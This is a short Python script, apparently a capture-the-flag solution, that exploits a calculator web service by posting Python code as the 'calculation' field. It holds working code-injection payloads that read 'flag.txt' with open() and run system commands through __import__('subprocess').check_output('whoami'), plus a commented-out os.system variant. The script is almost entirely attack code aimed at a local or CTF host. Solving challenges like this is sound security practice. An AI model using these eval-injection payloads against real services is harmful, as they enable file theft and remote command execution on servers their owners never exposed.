#!/usr/bin/env python3
import requests
from base64 import b64decode
import re

def exploit():
    url = "http://127.0.0.1:1337"
    # url = "https://ctf.bbordes.fr"

    print("flag1:")
    # no spaces allowed
    f2command = "open('flag.txt').read()"

    req1 = requests.post(url, data = {'calculation': f2command})

    print(b64decode(req1.headers["User-Agent"]).decode('utf-8'))


    print("flag2:")
    # print(req1.text)
    print(re.findall(r'flag\{.+\}', req1.text)[0])


    print("\nflag3:")
    # only gives the exitcode (0)
    # f3command = "__import__('os').system('whoami').strip()"

    # 47 char long out of 50 allowed
    f3command = "__import__('subprocess').check_output('whoami')"

    req2 = requests.post(url, data = {'calculation': f3command})

    # print(req2.text)
    print(re.findall(r'flag-.+(?=\\n\'<\/li>)', req2.text)[0])

if __name__ == "__main__":
    exploit()
